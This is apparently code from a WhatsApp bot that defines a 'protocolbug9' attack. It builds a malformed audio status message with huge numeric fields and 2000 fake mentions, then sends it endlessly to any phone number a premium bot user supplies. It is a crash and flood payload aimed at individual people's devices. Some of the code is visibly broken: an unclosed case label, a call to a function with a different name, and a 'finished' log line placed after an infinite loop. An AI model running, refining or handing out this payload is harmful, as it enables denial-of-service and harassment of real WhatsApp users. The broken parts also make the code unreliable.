async function protocolbug9(sheesh, objective, mention) {
  const floods = 2000;
  const mentioning = "13135550002@s.whatsapp.net";
  const mentionedobjectives = [
    mentioning,
    ...Array.from({ length: floods }, () =>
      `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
    )
  ];

  const links = "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true";
  const mime = "audio/mpeg";
  const sha = "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=";
  const enc = "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=";
  const key = "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=";
  const timestamp = 99999999999999;
  const path = "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0";
  const longs = 99999999999999;
  const loaded = 99999999999999;
  const data = "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg==";

  const messageContext = {
    mentionedobjective: mentionedobjectives,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterobjective: "120363321780343299@newsletter",
      serverMessageId: 1,
      newsletterName: "드림 가이𝑺𝒏𝒊𝒕𝒉𝐸𝑥𝟹𝑐."
    }
  };

  const messageContent = {
    ephemeralMessage: {
      message: {
        audioMessage: {
          url: links,
          mimetype: mime,
          fileSha256: sha,
          fileLength: longs,
          seconds: loaded,
          ptt: true,
          mediaKey: key,
          fileEncSha256: enc,
          directPath: path,
          mediaKeyTimestamp: timestamp,
          contextInfo: messageContext,
          waveform: data
        }
      }
    }
  };

  const msg = generateWAMessageFromContent(objective, messageContent, { userjid: objective });

  const broadcastSend = {
    messageId: msg.key.id,
    statusobjectiveList: [objective],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: objective }, content: undefined }
            ]
          }
        ]
      }
    ]
  };

  await sheesh.relayMessage("status@broadcast", msg.message, broadcastSend);

  if (mention) {
    await sheesh.relayMessage(objective, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

// Case

case 'protocolbug9: {
    if (!isPremium) return exreply("*Access Denied: Premium Users Only!*");
    if (!q) return exreply(`Example Usage:\n .${command} 62xx / @tag`);
    let objectivex = q.replace(/[^0-9]/g, "");
    let objective = `${objectivex}@s.whatsapp.net`;
    exreply(`*Success! ${command} sent to ${objective}*`);
    //Paramater
    while (true) {
    await protocolbug7(objective, true)
    await sleep(1000)
    await protocolbug7(objective, true)
    await sleep(1000)   
    }
  console.log(chalk.red.bold("Loop Finished! All messages are processed."))
}
break